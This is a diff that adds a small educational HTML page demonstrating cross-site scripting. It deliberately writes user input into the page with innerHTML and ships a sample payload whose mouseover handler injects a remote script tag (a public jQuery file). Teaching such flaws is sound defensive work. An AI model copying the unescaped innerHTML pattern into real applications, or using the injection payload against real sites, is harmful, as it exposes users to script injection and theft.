@@ -1,0 +1,74 @@
+<!--
+ * This software can be used solely in educational purposes, all other uses are prohibited.
+ * No derivative works are allowed.
+ *
+ * The above copyright notice and this permission notice shall be included in
+ * all copies or substantial portions of the Software.
+ *
+ * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+ * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+ * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+ * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+ * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+ * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
+ * THE SOFTWARE.
+-->
+<!--
+Demo of a cross-site scripting vulnerability.
+Usually validation for unsafe submitted content that looks like HTML and JavaScript is done 
+on the server side and such content is properly escaped so as not to be executed by the browser.
+Make sure you do not permit to add/submit such content in your Web application!
+-->
+<html>
+<head>
+<script type="text/javascript">
+function addEventListeners() {
+  var textField = document.getElementById("textField");
+  var addButton = document.getElementById("addButton");
+  var textEntries = document.getElementById("textEntries");
+
+  addButton.addEventListener("click", appendText, false);
+
+  function appendText() {
+    var newEntry = document.createElement('p');
+    newEntry.innerHTML = textField.value;
+    //This is the preferred way to add content, will not be possible to insert HTML/JavaScript
+    //var newEntry = document.createTextNode(textField.value);
+
+    textEntries.appendChild(newEntry);    
+  }
+}
+
+window.addEventListener("load", addEventListeners, false);
+</script>
+</head>
+<body>
+
+<p>
+Message text:
+</p>
+
+<textarea
+  id = "textField"
+  size="1000"
+  cols="100"
+  rows="15">
+<!-- Example of JavaScript code that can be added to the page, just move your mouse over the message:
+1. It can be executed in the background without visible side effects
+2. The message will look similar to other messages
+In this example we load the JQuery library in the background.
+-->
+<span onMouseOver="javascript:var head= document.getElementsByTagName('head')[0];
+var script= document.createElement('script');
+script.type= 'text/javascript';
+script.src= 'http://ajax.googleapis.com/ajax/libs/jquery/1.5.2/jquery.min.js';
+head.appendChild(script);">New message</span>
+
+</textarea>
+<br/>
+<button id="addButton" type="button">Add message</button>
+
+<span id="textEntries"></span>
+
+</body>
+</html>
